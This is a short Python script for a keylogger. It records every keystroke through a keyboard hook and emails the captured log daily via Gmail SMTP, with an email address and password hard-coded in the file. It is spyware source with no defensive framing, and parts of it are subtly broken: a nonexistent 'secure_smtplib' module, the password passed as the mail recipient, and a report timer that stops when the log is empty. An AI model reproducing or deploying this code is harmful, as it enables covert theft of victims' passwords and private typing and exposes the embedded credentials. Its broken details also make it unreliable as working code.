import keyboard
import secure_smtplib
from threading import Semaphore,Timer

#24 hours time gap for sending each mail
TTL= 86400
#enter the email_id as well as password here
EMAIL_ID = "abinesh.k@skillsafari.in"
PSWD = "shalinikannan"

class Keylogger:
    def __init__(self,interval):
        self.interval = interval
        self.log=""
        #semaphore is used for blocking after setting on realse timmer
        self.semaphore = Semaphore(0)
    
    def callback(self, event):
        #callback func  is invocked when ever a keystroke is pressed/relased
        name=event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name=f"[{name.upper()}]"

        self.log +=name
    
    def sendmail(self,email,key,msg):
        #function name itself says what it will do
        server=secure_smtplib.SMTPS(host="smtp.gmail.com",port = 587)
        server.starttls()
        server.login(email,key)
        server.sendmail(email,key,msg)
        server.quit()
    
    def report(self):
        #it is called at every self.interval exceeds
        #it also Resets self.log 
        if self.log:
            self.sendmail(EMAIL_ID,PSWD,self.log)
            self.log = ""
            Timer(interval=self.interval, function=self.report).start()

    def start(self):
        #it starts the keylogger 
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()

if __name__ == "__main__":
    keylogger=Keylogger(interval=TTL)
    keylogger.start()


